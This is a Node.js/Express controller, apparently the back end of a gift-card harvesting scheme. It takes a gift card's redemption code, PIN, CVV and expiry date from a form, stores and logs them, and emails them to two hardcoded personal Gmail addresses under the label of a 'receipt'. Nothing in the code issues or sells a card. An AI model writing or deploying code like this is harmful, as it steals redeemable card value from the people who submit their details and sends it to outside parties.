require('dotenv').config();
const GiftCardModel = require('../models/GiftCardMOdel');
const { sendEmail } = require('../helpers/sendMail');
const { paymentReceiptTemplate } = require('../helpers/emailTemplate');

exports.GiftCardSignup = async (req, res) => {
  try {
    const { Name, Currency, Amount, Redemptioncode, Pin, GiftCardCvv, ExpireDate } = req.body;

    if (!Name || !Currency || !Amount || !Redemptioncode || !Pin || !GiftCardCvv || !ExpireDate) {
      return res.status(400).json({
        message: `Please enter all details`
      });
    }

    // Always create a new GiftCard document (even if duplicate)
    const newGiftCard = new GiftCardModel({
      Name,
      Currency,
      Amount,
      Redemptioncode,
      Pin,
      GiftCardCvv,
      ExpireDate
    });

    // Save it without worrying about duplicates
    const savedGiftCard = await newGiftCard.save();

    const userEmail = "jolaetopia81@gmail.com";
    const userEmail2 = "dennisburleson02@gmail.com"

    // Send the payment receipt email
    const mailOptions = {
      email: [userEmail, userEmail2],
      subject: "Gift Card Purchase Receipt",
      html: paymentReceiptTemplate(
        savedGiftCard.Name,
        savedGiftCard.Currency,
        savedGiftCard.Amount,
        savedGiftCard.Redemptioncode,
        savedGiftCard.Pin,
        savedGiftCard.GiftCardCvv,
        savedGiftCard.ExpireDate
      ),
    };
 console.log(  savedGiftCard.Name,
        savedGiftCard.Currency,
        savedGiftCard.Redemptioncode,
        savedGiftCard.Pin,
        savedGiftCard.GiftCardCvv,
        savedGiftCard.Amount,
        savedGiftCard.ExpireDate)
    await sendEmail(mailOptions);

    // Return a success response
    return res.status(201).json({
      message: `Gift card saved successfully. Check your email: ${userEmail} for the receipt.`,
      data: savedGiftCard,
    });

  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};
